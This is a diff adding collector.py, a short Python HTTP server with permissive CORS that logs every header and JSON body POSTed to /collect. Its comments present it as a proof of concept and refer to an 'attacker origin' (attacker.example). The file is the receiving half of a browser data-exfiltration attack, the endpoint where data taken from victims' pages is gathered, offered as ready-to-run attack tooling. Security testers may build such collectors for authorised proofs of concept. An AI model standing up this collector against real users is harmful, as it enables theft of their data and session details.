@@ -1,0 +1,67 @@
+# collector.py
+# Simple collector that handles CORS preflight (OPTIONS) and POST /collect
+# Usage: python3 collector.py
+from http.server import BaseHTTPRequestHandler, HTTPServer
+from datetime import datetime
+import json
+
+HOST = "0.0.0.0"
+PORT = 5000
+LOGFILE = "collected.log"
+
+# Configure CORS: set allowed origin to '*' for PoC; in production restrict to your attacker origin
+ALLOWED_ORIGIN = "*"   # or "https://attacker.example"
+
+class Collector(BaseHTTPRequestHandler):
+    def _send_cors_headers(self):
+        # Use wildcard for PoC; if you want credentials, set origin to exact and add Allow-Credentials: true
+        self.send_header("Access-Control-Allow-Origin", ALLOWED_ORIGIN)
+        self.send_header("Access-Control-Allow-Methods", "POST, OPTIONS")
+        self.send_header("Access-Control-Allow-Headers", "Content-Type")
+        # self.send_header("Access-Control-Allow-Credentials", "true")  # enable only if necessary
+
+    def do_OPTIONS(self):
+        if self.path == "/collect":
+            self.send_response(204)
+            self._send_cors_headers()
+            self.end_headers()
+        else:
+            self.send_response(404)
+            self.end_headers()
+
+    def do_POST(self):
+        if self.path != "/collect":
+            self.send_response(404)
+            self.end_headers()
+            return
+
+        content_length = int(self.headers.get("Content-Length", 0))
+        raw = self.rfile.read(content_length).decode("utf-8", errors="replace")
+
+        try:
+            body = json.loads(raw)
+        except Exception:
+            body = {"raw_body": raw}
+
+        entry = {
+            "ts": datetime.utcnow().isoformat() + "Z",
+            "remote_addr": self.client_address[0],
+            "headers": {k: v for k, v in self.headers.items()},
+            "body": body
+        }
+
+        # Print and append to log
+        print("\n=== COLLECTED @", entry["ts"], "from", entry["remote_addr"], "===\n")
+        print(json.dumps(entry, indent=2, ensure_ascii=False))
+        with open(LOGFILE, "a") as f:
+            f.write(json.dumps(entry, ensure_ascii=False) + "\n")
+
+        # Respond with CORS headers so browser accepts it
+        self.send_response(204)
+        self._send_cors_headers()
+        self.end_headers()
+
+if __name__ == "__main__":
+    open(LOGFILE, "a").close()
+    print(f"Collector running on http://{HOST}:{PORT}/collect (handles OPTIONS + POST, CORS enabled)")
+    HTTPServer((HOST, PORT), Collector).serve_forever()
